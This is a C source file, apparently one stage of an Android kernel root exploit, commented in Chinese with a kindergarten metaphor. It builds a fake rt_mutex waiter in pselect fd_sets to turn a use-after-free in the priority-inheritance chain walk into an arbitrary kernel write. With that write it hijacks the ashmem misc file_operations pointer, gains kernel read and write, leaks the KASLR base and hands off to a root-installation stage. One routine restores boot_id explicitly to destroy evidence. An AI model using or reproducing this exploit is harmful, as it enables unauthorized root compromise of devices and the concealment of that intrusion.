/* ==========================================================================
 * 【第 2 关】偷换玩具柜的钥匙牌 —— FOPS 劫持
 * ==========================================================================
 * 目标柜子 = ashmem 设备：misc 框架的 ashmem_misc.fops 槽(.data)存着
 * "谁能开柜子"的钥匙牌地址。把它换成书包(回收页)里的假钥匙牌 fake_fops，
 * 以后 open("/dev/ashmem") 拿到的 file->f_op 就是假牌 -> 假 read_iter
 * (configfs_read_iter: offset=内核地址读原语) / write_iter(写原语)。
 *
 * W1 任意写原语(6.1.138 源码逐行验证，见 boot.md):
 *   consumer sched_setattr(nice) -> rt_mutex_setprio -> rt_mutex_adjust_pi
 *     (早退检查 prio: 鬼标签 prio=130 != CFS 120 -> 全链)
 *   -> rt_mutex_adjust_prio_chain(task, MIN_CHAINWALK, NULL, next_lock, ...)
 *     [3] next_lock == waiter->lock(fake_lock) 校验通过
 *     [4] lock = waiter->lock = fake_lock(页内)
 *     [5] trylock(fake_lock->wait_lock=0) 成功
 *     [7] owner=fake_task|1(非NULL 非 walk task) -> 走 dequeue 全链:
 *         rt_mutex_dequeue(fake_lock, 鬼waiter) -> rb_erase_cached(tree_entry)
 *         rt_mutex_dequeue_pi(fake_task, 鬼waiter) -> rb_erase_cached(pi_tree)
 *         两处 rb_right=0 且 rb_left=写目标 -> rbtree.c "Still case 1, the
 *         child is node->rb_left": tmp->__rb_parent_color = pc
 *         ==> *(u64*)tree_left = tree_pc   【W1】x2
 *         该分支 rebalance 恒 NULL(无 __rb_erase_color 重平衡)
 *         (owner==NULL 是旧 bug: walk 走 "lock is free" 分支直接 wake
 *          退出, rb_erase 永不执行 -> 23 次全 step=4 且无 panic)
 *     [8] waiter_update_prio(栈上写) + enqueue 挂回黑根(页内写)
 *     [9] walk 下一跳 task=fake_task -> pi_blocked_on=0 终止链;
 *         wake_up_state(fake_task, 3): fake_task.__state=0 -> ttwu 早退
 *
 * fd_set 布局 = slide.c 真机验证的 11-word 骨架(shift=3)，tree 与
 * pi_tree 两组格子都换成 fops 语义：parent_color=fake_fops(写入值)，
 * rb_left=misc_fops 槽运行时地址(写目标，需 KASLR)。其余格子与
 * slide 完全一致(fake_task/fake_lock/prio=130)，保证 walk 只碰：
 * 栈上鬼标签 + 喷射页 + misc_fops 槽(.data 必可写)。
 * ========================================================================== */

#include "common.h"

#define PSELECT_CFI_ROUTE_ATTEMPTS 24

/* DEPTH 渐进验证(slide.c 真机验证机制移植):
 * DEPTH 0: 鬼标签 prio 种 120 —— __waiter_prio() 对 CFS task 恒返回
 *   DEFAULT_PRIO(120),与 nice 无关 -> rt_mutex_waiter_equal() 命中 ->
 *   rt_mutex_adjust_pi 零解引用早退。跑通即证明 shift 对齐(prio 字段
 *   读到的确实是我们种的值)且 UAF+walk 入口打通;崩了说明 shift 错
 *   (prio 读垃圾 -> 走全链 -> fake_lock 解引用炸)。
 * DEPTH 2: prio=130 全链真跑(dequeue/enqueue/W1 写 misc_fops)。 */
#define FOPS_DEPTH_EARLY_EXIT 0
#define FOPS_DEPTH_FULL_CHAIN 2
#define FOPS_CFS_WAITER_PRIO 120

static int fops_probe_depth = FOPS_DEPTH_EARLY_EXIT;
static int fops_shift_verified = -100;

atomic_int cfi_stage_done;
ssize_t cfi_write_ret = -1;
ssize_t cfi_read_ret = -1;
ssize_t cfi_read_slot_ret = -1;
ssize_t cfi_owner_ret = -1;
ssize_t cfi_restore_ret = -1;
uint64_t fops_before;
uint64_t fops_after;
int cfi_attempts;
int pipe_stage_attempts;
int cfi_dirty_seen;
int cfi_last_step;
int cfi_last_errno;
int kaslr_done;
int kaslr_step;
uint64_t kaslr_fops_alias;
uint64_t kaslr_open_ptr;
uint64_t kaslr_ioctl_ptr;
uint64_t kaslr_mmap_ptr;
uint64_t kaslr_release_ptr;
uint64_t kaslr_show_fdinfo_ptr;
uint64_t kaslr_base;
uint64_t kaslr_slide;
uint64_t kaslr_expected_ioctl;
uint64_t kaslr_expected_mmap;
uint64_t kaslr_expected_release;
uint64_t kaslr_expected_show_fdinfo;
uint64_t slide_bootid_before;
uint64_t slide_bootid_after;
uint64_t slide_bootid_want;
ssize_t slide_bootid_restore_ret = -1;

static int route_delay_usec(int attempt) {
  static const int delays[] = {
    50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
  };

  int count = (int)(sizeof(delays) / sizeof(delays[0]));
  return delays[(attempt - 1) % count];
}

void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}

uint64_t fdset_get_word(const fd_set *set, int word) {
  const unsigned long *bits = (const unsigned long *)set;
  return bits[word];
}

static int pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (PSELECT_ROUTE_NFDS + bits_per_word - 1) / bits_per_word;
}

static int pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }
  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

static void pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int global_word = PSELECT_WAITER_WORD_SHIFT + waiter_word;
  int placed = pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               PSELECT_ROUTE_NFDS);
  }
}

/* 【阻塞锚点】armed fd 统一 dup2 成"未启动的 timerfd"——poll 永不就绪，
 * pselect 稳定睡满 timeout，consumer 才有时间喊老师(walk)。
 *
 * 不能用 pipe read end 当 blocking fd(真机实测 ret=148/160 秒回):
 *   pipe 写端 pipefd[1] 是低位 fd(3/4 附近), 恰好被本布局的 fdset armed
 *   (EX word0 = fake_lock 低位 0x84d8 -> fd 3,4,6,7,10,15;
 *    OUT word0 = misc_fops 低位 0xbec0 -> fd 6,7,9-15),
 *   dup2(high_read, 写端fd) 把唯一写端引用覆盖 -> pipe EOF ->
 *   全部 armed fd 立即 POLLHUP 就绪 -> pselect 秒回, consumer 的
 *   50ms delay 还没醒 punch_consume_go 已被清零 -> calls=0, walk 从未跑。
 * slide.c 真机验证版(pselect 路线)用的正是 timerfd, 这里对齐。 */
void open_selected_fds(fd_set *in, fd_set *out, fd_set *ex) {
  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  if (block_fd < 0) {
    pr_warning("pselect timerfd_create errno=%d\n", errno);
    return;
  }
  int high_block = fcntl(block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_block < 0) {
    pr_warning("pselect F_DUPFD timerfd errno=%d\n", errno);
    close(block_fd);
    return;
  }
  close(block_fd);
  int armed = 0;
  int dup_fail = 0;
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (fd < 3)
      continue; /* keep the tty fds: dup2 over stdout kills all output */
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      armed++;
      if (dup2(high_block, fd) < 0) {
        dup_fail++;
      }
    }
  }
  dup2(high_block, PSELECT_ROUTE_NFDS - 1);
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
  close(high_block);
  pr_info("pselect block fds armed=%d dup_fail=%d\n", armed, dup_fail);
}

/* 【涂改钥匙牌的准备】fd_set 每格 8 字节，11-word 布局(shift=3)对齐
 * slide.c 真机验证的 rt_mutex_waiter 骨架(BTF: tree 0x00 / pi_tree 0x18
 * / task 0x30 / lock 0x38 / wake_state 0x40 / prio 0x44)。
 * 【双 W1 写入点】对齐 Poc-Analysis 真机验证版: tree_entry 和
 * pi_tree_entry 都种 (parent_color=写入值, rb_left=目标, rb_right=0)。
 * walk 的 dequeue / dequeue_pi 各做一次 rb_erase_cached, 都命中
 * rbtree.c "Still case 1, the child is node->rb_left" 分支:
 *   tmp->__rb_parent_color = pc  ==>  *(u64*)目标 = 写入值  【W1】
 * 该分支 rebalance 恒 NULL(无视节点颜色, 无 __rb_erase_color)。
 * 副作用 __rb_change_child 写 写入值+8 (llseek 槽=页内自引用地址),
 * 由 try_cfi_stage 的 repair_fake_fops_llseek 修复。
 * 其余格子保持 slide 骨架(task/lock 页内, prio=130 触发全链)。 */
void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  int words_per_set = pselect_words_per_set();
  /* W1 写目标(运行时 misc_fops 槽地址)用 canon_addr = kaslr_base + image 偏移。
   * p0_data_alias 修正后, data_addr 也已正确别名到 misc_fops 所在物理页
   * (与 canon_addr 指向同一页), 故读侧 try_cfi_stage 改用 data_addr 与写侧
   * 同族。此处 fd_set 写目标保持 canon_addr(内核 walk 直接经此 VA 写),
   * 二者现等价, 不再有"别名指向无辜物理页"问题。 */
  uint64_t misc_fops_target = canon_addr(ASHMEM_MISC_FOPS);
  uint64_t waiter_prio_word = ((uint64_t)FAKE_WAITER_PRIO << 32) | 3;
  if (fops_probe_depth == FOPS_DEPTH_EARLY_EXIT) {
    waiter_prio_word = ((uint64_t)FOPS_CFS_WAITER_PRIO << 32) | 3;
  }

  struct fops_waiter_word {
    int word;
    uint64_t value;
    const char *name;
  } words[] = {
    {0, fake_fops, "tree_pc"},
    {1, 0, "tree_right"},
    {2, misc_fops_target, "tree_left"},
    {3, fake_fops, "pi_parent"},
    {4, 0, "pi_right"},
    {5, misc_fops_target, "pi_left"},
    {6, fake_task, "task"},
    {7, fake_lock, "lock"},
    {8, waiter_prio_word, "wake_state_prio"},
    {9, 0, "deadline"},
    {10, 0, "ww_ctx"},
  };
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    struct fops_waiter_word *w = &words[i];
    pselect_put_waiter_word(
        in, out, ex, words_per_set, w->word, w->value, w->name);
  }
}

/* 【趁交接瞬间动手】waiter 睡进 pselect(盖上假标签)后，本函数配合
 * consumer 反复喊老师改优先级 —— 园长每走一遍 PI 链，就有机会把
 * 书包地址写到玩具柜钥匙牌(ashmem fops)的 llseek 格上。
 * 不同 delay 轮换 = 调整"老师喊话"和"园长走路"的时间差(撞运气窗口)。 */
void do_pselect_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  int calls = 0;
  int success = 0;
  int route_verified = 0;
  for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
       route_attempt++) {
    if (route_attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 34;
        cfi_last_errno = errno;
        pr_error("pselect retry page prepare failed attempt=%d base=%016zx "
                 "lock=%016zx fops=%016zx\n",
                 route_attempt, page_base, fake_lock, fake_fops);
        break;
      }
    }

    fops_probe_depth = (PSELECT_WAITER_WORD_SHIFT == fops_shift_verified)
                           ? FOPS_DEPTH_FULL_CHAIN
                           : FOPS_DEPTH_EARLY_EXIT;

    fd_set in;
    fd_set out;
    fd_set ex;
    prepare_pselect_fdsets(&in, &out, &ex);
    pr_info("pselect route setup attempt=%d depth=%d (%s) page=%016zx "
            "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
            "fake_fops=%016zx misc_fops=%016llx kaslr_done=%d "
            "kaslr_base=%016llx shift=%d\n",
            route_attempt, fops_probe_depth,
            fops_probe_depth == FOPS_DEPTH_EARLY_EXIT
                ? "prio=120 early-exit: zero deref alignment probe"
                : "full chain: W1 write misc_fops",
            page_base, fake_lock, fake_w0, fake_task,
            fake_fops, (unsigned long long)canon_addr(ASHMEM_MISC_FOPS),
            kaslr_done, (unsigned long long)kaslr_base,
            PSELECT_WAITER_WORD_SHIFT);
    open_selected_fds(&in, &out, &ex);

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    int delay_usec = route_delay_usec(route_attempt);
    atomic_store(&main_route_delay_usec, delay_usec);
    atomic_store(&punch_consume_go, route_attempt);

    struct timespec timeout = {
        .tv_sec = fops_probe_depth == FOPS_DEPTH_EARLY_EXIT
                      ? 1
                      : PSELECT_TIMEOUT_SEC,
        .tv_nsec = 0,
    };
    struct timespec *timeoutp = &timeout;

    struct timespec t0;
    struct timespec t1;
    clock_gettime(CLOCK_MONOTONIC, &t0);
    errno = 0;
    int ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, timeoutp, NULL);
    int saved_errno = errno;
    clock_gettime(CLOCK_MONOTONIC, &t1);
    long elapsed_ms = (t1.tv_sec - t0.tv_sec) * 1000 +
                      (t1.tv_nsec - t0.tv_nsec) / 1000000;
    atomic_store(&punch_consume_go, 0);
    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    int ready_in = 0;
    int ready_out = 0;
    int ready_ex = 0;
    int first_ready[8];
    int n_first = 0;
    for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
      int ready = 0;
      if (FD_ISSET(fd, &in)) {
        ready_in++;
        ready = 1;
      }
      if (FD_ISSET(fd, &out)) {
        ready_out++;
        ready = 1;
      }
      if (FD_ISSET(fd, &ex)) {
        ready_ex++;
        ready = 1;
      }
      if (ready && n_first < 8) {
        first_ready[n_first++] = fd;
      }
    }
    pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d "
            "delay=%d elapsed_ms=%ld ready=%d/%d/%d first_ready=%d,%d,%d,%d,"
            "%d,%d,%d,%d\n",
            route_attempt, ret, saved_errno, calls, success, delay_usec,
            elapsed_ms, ready_in, ready_out, ready_ex,
            n_first > 0 ? first_ready[0] : -1,
            n_first > 1 ? first_ready[1] : -1,
            n_first > 2 ? first_ready[2] : -1,
            n_first > 3 ? first_ready[3] : -1,
            n_first > 4 ? first_ready[4] : -1,
            n_first > 5 ? first_ready[5] : -1,
            n_first > 6 ? first_ready[6] : -1,
            n_first > 7 ? first_ready[7] : -1);

    /* 诊断: 打印 fd_set diff, 看内核在 waiter 区域写回了什么
     * 全链(depth=2) 下 tree_left (w2 / out[0]) 应该被写成 tree_pc
     * —— 这就是 W1 写入的痕迹 */
    if (fops_probe_depth == FOPS_DEPTH_FULL_CHAIN) {
      fd_set in_pre, out_pre, ex_pre;
      prepare_pselect_fdsets(&in_pre, &out_pre, &ex_pre);
      int diff_count = 0;
      uint64_t *in_post = (uint64_t *)&in;
      uint64_t *in_pre_w = (uint64_t *)&in_pre;
      uint64_t *out_post = (uint64_t *)&out;
      uint64_t *out_pre_w = (uint64_t *)&out_pre;
      uint64_t *ex_post = (uint64_t *)&ex;
      uint64_t *ex_pre_w = (uint64_t *)&ex_pre;
      int n_words = PSELECT_ROUTE_NFDS / (8 * sizeof(uint64_t));
      for (int i = 0; i < n_words; i++) {
        if (in_post[i] != in_pre_w[i]) {
          pr_info("fops fdset DIFF in[%d] pre=%016llx post=%016llx\n",
                  i, (unsigned long long)in_pre_w[i],
                  (unsigned long long)in_post[i]);
          diff_count++;
        }
      }
      for (int i = 0; i < n_words; i++) {
        if (out_post[i] != out_pre_w[i]) {
          pr_info("fops fdset DIFF out[%d] pre=%016llx post=%016llx\n",
                  i, (unsigned long long)out_pre_w[i],
                  (unsigned long long)out_post[i]);
          diff_count++;
        }
      }
      for (int i = 0; i < n_words; i++) {
        if (ex_post[i] != ex_pre_w[i]) {
          pr_info("fops fdset DIFF ex[%d] pre=%016llx post=%016llx\n",
                  i, (unsigned long long)ex_pre_w[i],
                  (unsigned long long)ex_post[i]);
          diff_count++;
        }
      }
      pr_info("fops fdset diff total=%d (depth=%d)\n",
              diff_count, fops_probe_depth);
    }

    if (fops_probe_depth == FOPS_DEPTH_EARLY_EXIT) {
      /* DEPTH 0 探测轮: 早退路径零写零解引用,不可能弄脏 misc_fops,
       * 跳过 try_cfi_stage。活着回来且 consumer 确实喊过话,才认证
       * shift 对齐 + UAF 入口,升级下一轮全链。 */
      if (calls > 0 && success > 0) {
        fops_shift_verified = PSELECT_WAITER_WORD_SHIFT;
        pr_success("pselect depth0 survived attempt=%d calls=%d success=%d "
                   "elapsed_ms=%ld => shift=%d alignment + UAF walk entry "
                   "verified; next attempt runs full chain\n",
                   route_attempt, calls, success, elapsed_ms,
                   PSELECT_WAITER_WORD_SHIFT);
      } else {
        pr_warning("pselect depth0 attempt=%d calls=%d success=%d "
                   "elapsed_ms=%ld (consumer idle; retrying probe)\n",
                   route_attempt, calls, success, elapsed_ms);
      }
      continue;
    }

    int route_signal = calls > 0 && success > 0;
    if (route_signal) {
      if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
    } else if (!route_verified) {
      cfi_last_step = 33;
      cfi_last_errno = saved_errno;
    }

    if (route_verified || cfi_dirty_seen || !route_signal) {
      break;
    }
    pr_info("pselect cfi miss attempt=%d/%d step=%d errno=%d; refreshing FOPS page\n",
            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_step,
            cfi_last_errno);
  }
  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, cfi_last_step, cfi_last_errno);
}

int repair_fake_fops_llseek(int fd) {
  uint64_t llseek = text_addr(NOOP_LLSEEK);
  uint64_t after = 0;
  uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
  ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));
  ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
  return wr == (ssize_t)sizeof(llseek) &&
         rd == (ssize_t)sizeof(after) &&
         after == llseek;
}

/* 【把假钥匙牌的格子填成真函数】书包里的假钥匙牌刚抢到手时格子内容
 * 可能被踩过，这里逐格回填真实函数地址(read_iter/write_iter/ioctl...)，
 * 让假牌"看起来完全正常"，园长按牌找人时直接跳到真函数。 */
int refresh_fake_fops_text(int fd) {
  struct fops_slot {
    size_t off;
    uint64_t value;
  } slots[] = {
    {FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER)},
    {FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER)},
    {FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL)},
    {FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL)},
    {FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP)},
    {FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN)},
    {FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE)},
    {FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ)},
    {FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO)},
  };

  for (size_t i = 0; i < sizeof(slots) / sizeof(slots[0]); i++) {
    uintptr_t target = fake_fops + slots[i].off;
    if (kernel_write_data(fd, target, &slots[i].value,
        sizeof(slots[i].value)) !=
        (ssize_t)sizeof(slots[i].value)) {
      return 0;
    }
  }
  return 1;
}

/* 【第 1 关备胎: 用偷来的读牌能力反推门牌】如果 slide/perf 都没拿到
 * 门牌号，这里用假钥匙牌的 configfs_read 读真钥匙牌(ashmem fops)上的
 * open/ioctl/mmap 函数地址 —— 真函数地址 - 编译期偏移 = 园长门牌 _stext。
 * 五个格子互相印证，全对上才算数。 */
int leak_kernel_base(int fd) {
  /* 真 fops 表(ashmem_fops)的运行时地址 —— canon_addr 叠 KASLR slide。
   * p0_data_alias 是 slide=0 别名(指向无辜物理页),slide 巨大时读到垃圾。 */
  kaslr_fops_alias = canon_addr(ASHMEM_FOPS);
  kaslr_open_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_OPEN_OFF);
  kaslr_ioctl_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_IOCTL_OFF);
  kaslr_mmap_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_MMAP_OFF);
  kaslr_release_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_RELEASE_OFF);
  kaslr_show_fdinfo_ptr =
    kernel_read64(fd, kaslr_fops_alias + FOPS_SHOW_FDINFO_OFF);

  if (!is_kernel_ptr(kaslr_open_ptr) || !is_kernel_ptr(kaslr_ioctl_ptr) ||
      !is_kernel_ptr(kaslr_mmap_ptr) || !is_kernel_ptr(kaslr_release_ptr) ||
      !is_kernel_ptr(kaslr_show_fdinfo_ptr)) {
    kaslr_step = 1;
    return 0;
  }

  kaslr_base = kaslr_open_ptr - (ASHMEM_OPEN - KIMAGE_TEXT_BASE);
  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  kaslr_expected_ioctl = text_addr(ASHMEM_IOCTL);
  kaslr_expected_mmap = text_addr(ASHMEM_MMAP);
  kaslr_expected_release = text_addr(ASHMEM_RELEASE);
  kaslr_expected_show_fdinfo = text_addr(ASHMEM_SHOW_FDINFO);

  if (kaslr_ioctl_ptr != kaslr_expected_ioctl ||
      kaslr_mmap_ptr != kaslr_expected_mmap ||
      kaslr_release_ptr != kaslr_expected_release ||
      kaslr_show_fdinfo_ptr != kaslr_expected_show_fdinfo) {
    kaslr_done = 0;
    kaslr_step = 2;
    return 0;
  }

  if (!refresh_fake_fops_text(fd)) {
    kaslr_done = 0;
    kaslr_step = 3;
    return 0;
  }

  kaslr_step = 0;
  return 1;
}

/* 【擦掉纸条上的墨痕】第 1 关在 boot_id 纸条上留了墨痕(门牌号)，
 * 园长可能会发现纸条被改过 —— 这里用万能写把它写回原样，毁灭证据。
 * 主路线(tracefs 侧信道)从不动 boot_id: 先读一眼,不是内核指针就说明
 * 纸条干净,直接过关 —— slide 巨大时 P0 别名指向无辜物理页,
 * 无条件读写会污染别人的内存。 */
int restore_slide_boot_id(int fd) {
  uintptr_t boot_id_data = SLIDE_RANDOM_BOOT_ID_DATA;
  slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_before, sizeof(slide_bootid_before));
  if ((slide_bootid_before >> 48) != 0xffff) {
    pr_info("slide boot_id clean pid=%d before=%016llx (not a kernel ptr, "
            "tracefs route never touched it; skip restore)\n",
            getpid(), (unsigned long long)slide_bootid_before);
    slide_bootid_restore_ret = (ssize_t)sizeof(slide_bootid_want);
    slide_bootid_after = slide_bootid_before;
    return 1;
  }
  slide_bootid_restore_ret =
    configfs_write_once(
        fd, boot_id_data, &slide_bootid_want, sizeof(slide_bootid_want));
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_after, sizeof(slide_bootid_after));
  pr_info("slide restore boot_id data pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx errno=%d\n",
          getpid(), slide_bootid_restore_ret,
          (unsigned long long)slide_bootid_before,
          (unsigned long long)slide_bootid_want,
          (unsigned long long)slide_bootid_after, errno);
  return slide_bootid_restore_ret == (ssize_t)sizeof(slide_bootid_want) &&
         slide_bootid_after == slide_bootid_want;
}

/* 【接力交棒】第 2 关(钥匙牌)到手后立刻传给第 3 关(水管改造)和
 * 第 4 关(戴徽章) —— install_pipe_physrw 在 pipe.c，install_android_root
 * 在 root.c。 */
int install_child_root(int fd) {
  return install_pipe_physrw(fd) && install_android_root(fd);
}

/* 【第 2 关验收】确认钥匙牌真的被偷换成功：读出玩具柜真钥匙牌上的
 * llseek 格，看是否已变成书包里的假钥匙牌地址(脏了=偷换成功)。 */
int try_cfi_stage(void) {
  cfi_attempts++;
  int fd = open_ashmem_device();
  int dirty = 0;
  int can_read_back = 0;

  if (fd < 0) {
    cfi_last_step = 11;
    cfi_last_errno = errno;
    return 0;
  }

  /* 读侧与写侧同族: W1 写目标经 data_addr(见 prepare_skb_payload 的
   * write_right, 与 canon_addr 现已指向同一物理页), 这里也用 data_addr
   * 读回同一页。p0_data_alias 修正后 data_addr 正确别名到 misc_fops 所在
   * 物理页, 读到的即为 W1 写入的 fake_fops; 与上游(Poc-Analysis 已验证版)
   * 完全一致。 */
  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
  uint64_t pre_fops = 0;
  ssize_t pre_rb = configfs_read_once(
      fd, misc_fops, &pre_fops, sizeof(pre_fops));
  if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
    fops_before = pre_fops;
    cfi_last_step = 4;
    cfi_last_errno = errno;
    pr_info("cfi step=4 (W1 miss) pre_rb=%zd pre_fops=%016llx "
            "expected_fake_fops=%016llx misc_fops_addr=%016llx "
            "canon_misc_fops=%016llx\n",
            pre_rb, (unsigned long long)pre_fops,
            (unsigned long long)fake_fops,
            (unsigned long long)misc_fops,
            (unsigned long long)canon_addr(ASHMEM_MISC_FOPS));
    goto fail;
  }

  char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
  ssize_t n =
    configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
  cfi_write_ret = n;
  pr_info("cfi write ret=%zd errno=%d\n", n, errno);
  if (n != (ssize_t)sizeof(payload)) {
    cfi_last_step = 1;
    cfi_last_errno = errno;
    goto fail;
  }
  dirty = 1;
  cfi_dirty_seen = 1;

  if (!repair_fake_fops_llseek(fd)) {
    cfi_last_step = 2;
    cfi_last_errno = errno;
    goto fail;
  }
  cfi_read_slot_ret = sizeof(uint64_t);
  can_read_back = 1;

  char readback[sizeof(payload)];
  memset(readback, 0, sizeof(readback));
  ssize_t r =
    configfs_read_once(fd, binwrite_target, readback, sizeof(readback));
  cfi_read_ret = r;
  pr_info("cfi read ret=%zd errno=%d\n", r, errno);
  if (r != (ssize_t)sizeof(readback) ||
      memcmp(readback, payload, sizeof(payload)) != 0) {
    cfi_last_step = 3;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t before = 0;
  ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));
  fops_before = before;
  if (rb != (ssize_t)sizeof(before) || before != fake_fops) {
    cfi_last_step = 4;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!restore_slide_boot_id(fd)) {
    cfi_last_step = 10;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!leak_kernel_base(fd)) {
    cfi_last_step = 9;
    cfi_last_errno = errno;
    goto fail;
  }

  int installed = 0;
  pipe_stage_attempts = 0;
  for (int attempt = 0; attempt < PIPE_MAX_ATTEMPTS; attempt++) {
    pipe_stage_attempts++;
    if (attempt != 0) {
      reset_pipe_attempt();
    }
    if (install_child_root(fd)) {
      installed = 1;
      break;
    }
    if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
        physrw_read64_ok && physrw_write64_ok) {
      break;
    }
  }

  if (!installed) {
    cfi_last_step = 8;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
  ssize_t restore = configfs_write_once(
      fd, misc_fops, &original_fops, sizeof(original_fops));
  cfi_restore_ret = restore;
  if (restore != (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 5;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t after = 0;
  ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
  fops_after = after;
  if (ra != (ssize_t)sizeof(after) || after != canon_addr(ASHMEM_FOPS)) {
    cfi_last_step = 6;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t null_owner = 0;
  ssize_t owner =
    configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
  cfi_owner_ret = owner;
  SYSCHK(close(fd));
  if (owner == (ssize_t)sizeof(null_owner) &&
      restore == (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 0;
    cfi_last_errno = 0;
    atomic_store(&cfi_stage_done, 1);
    return 1;
  }
  cfi_last_step = 7;
  cfi_last_errno = errno;
  return 0;

fail:
  if (dirty) {
    uint64_t original_fops_fail = p0_data_alias(ASHMEM_FOPS);
    if (kaslr_done) {
      original_fops_fail = canon_addr(ASHMEM_FOPS);
    }
    cfi_restore_ret = configfs_write_once(
        fd, misc_fops, &original_fops_fail, sizeof(original_fops_fail));
    if (can_read_back &&
        cfi_restore_ret == (ssize_t)sizeof(original_fops_fail)) {
      uint64_t after_fail = 0;
      if (configfs_read_once(fd, misc_fops, &after_fail, sizeof(after_fail)) ==
          (ssize_t)sizeof(after_fail)) {
        fops_after = after_fail;
      }
    }
    uint64_t null_owner_fail = 0;
    cfi_owner_ret = configfs_write_once(
        fd, fake_fops, &null_owner_fail, sizeof(null_owner_fail));
  }
  SYSCHK(close(fd));
  return 0;
}
